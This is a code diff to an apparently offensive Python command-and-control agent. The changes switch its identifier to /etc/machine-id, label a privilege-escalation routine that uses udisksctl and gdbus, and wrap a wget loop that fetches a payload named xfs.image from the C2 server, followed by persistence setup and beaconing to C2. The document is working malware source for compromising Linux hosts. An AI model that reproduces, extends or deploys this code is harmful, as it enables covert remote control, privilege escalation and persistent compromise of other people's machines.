@@ -13,19 +13,19 @@ import glob
 
 C2_IP = IP_HOST # Adapt according to your network
 C2_PORT = 9999
-AGENT_ID_FILE = "/tmp/.conf-C0"  # File to retain the same ID between sessions
+AGENT_ID_FILE = ""  # get machine id from /etc/machine-id
 
 def get_python_version():
     return sys.version.split()[0]
 
 def get_agent_id():
-    if os.path.exists(AGENT_ID_FILE):
-        with open(AGENT_ID_FILE, "r") as f:
-            return f.read().strip()
-    new_id = str(uuid.uuid4())
-    with open(AGENT_ID_FILE, "w") as f:
-        f.write(new_id)
-    return new_id
+    if (AGENT_ID_FILE == ""):
+        # Use machine-id as agent ID
+        try:
+            with open("/etc/machine-id", "r") as f:
+                return f.read().strip()
+        except FileNotFoundError:
+            return "NO_MACHINE_ID_FOUND"
 
 def get_ip_address():
     try:
@@ -103,6 +103,10 @@ def run_command(cmd, shell=False, capture_output=True):
         print(f"[+] Output:\n{output}\n")
     return output
 
+##########################################################################
+# Function to try privilege escalation using udisksctl and gdbus    
+##########################################################################
+
 def try_escalation():
     # 1. Kill gvfs monitor
     user = run_command(["whoami"], shell=True)
@@ -174,15 +178,26 @@ WantedBy=multi-user.target
         exit(0)
 
 if __name__ == "__main__":
-    # pull from the C2_IP variable a file named xfs.image (it is a python server) try until you download it    
-    if not os.path.exists("/tmp/xfs.image"):
-        print("[*] Downloading xfs.image from C2...")
-        while not os.path.exists("/tmp/xfs.image"):
-            try:
-                subprocess.run(["wget", f"http://{C2_IP}:8000/xfs.image", "-O", "/tmp/xfs.image"])
-            except subprocess.CalledProcessError as e:
-                print(f"[!] Failed to download xfs.image: {e}")
-                time.sleep(5)
+###################################################################################
+# Main execution starts here
+# This script will run on the agent side to connect to the C2 server and send system
+# information, and it will also handle command execution from the C2 server.
+
+# First part of the script is to ensure that the agent is persistent
+# and can run even after reboot.
+
+# only do the while loop if the attack is only meant as a C2 agent
+###################################################################################
+    # pull from the C2_IP variable a file named xfs.image (it is a python server) try until you download it  
+    if os.geteuid() != 0:  
+        if not os.path.exists("/tmp/xfs.image"):
+            print("[*] Downloading xfs.image from C2...")
+            while not os.path.exists("/tmp/xfs.image"):
+                try:
+                    subprocess.run(["wget", f"http://{C2_IP}:8000/xfs.image", "-O", "/tmp/xfs.image"])
+                except subprocess.CalledProcessError as e:
+                    print(f"[!] Failed to download xfs.image: {e}")
+                    time.sleep(5)
     make_permanent()
     while True:
         send_to_c2()
